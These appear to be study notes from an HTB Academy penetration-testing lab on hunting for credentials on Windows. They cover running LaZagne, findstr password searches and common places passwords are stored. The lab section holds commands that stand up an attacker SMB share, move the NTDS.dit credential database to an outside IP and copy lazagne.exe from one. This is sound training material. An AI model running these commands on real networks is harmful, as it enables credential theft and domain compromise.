# Credential Hunting in windows

What might an IT admin be doing on a day-to-day basis & which of those tasks may require credentials?

key terms we can use :
Passwords	Passphrases	Keys
Username	User account	Creds
Users	Passkeys	Passphrases
configuration	dbcredential	dbpassword
pwd	Login	Credentials

## Search Tools

Use the windows default search tool

## Running Lazagne All

start lazagne.exe all

-vv option : see attempts to gather passwords

## Findstr

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

## Additionnal considerations

Passwords in Group Policy in the SYSVOL share
Passwords in scripts in the SYSVOL share
Password in scripts on IT shares
Passwords in web.config files on dev machines and IT shares
unattend.xml
Passwords in the AD user or computer description fields
KeePass databases --> pull hash, crack and get loads of access.
Found on user systems and shares
Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

# LAB

xfreerdp /u:Bob /p:"HTB_@cademy_stdnt!" /v:$TARGET

sudo impacket-smbserver share -smb2support /tmp/smbshare

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-786011/

cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.14.104\CompData 

cmd.exe /c copy \\10.10.15.45\share\lazagne.exe

xfreerdp /u:Bob /p:"HTB_@cademy_stdnt!" /v:$TARGET /drive:linux,/home/htb-ac-786011/
To access the directory, we can connect to \\tsclient\
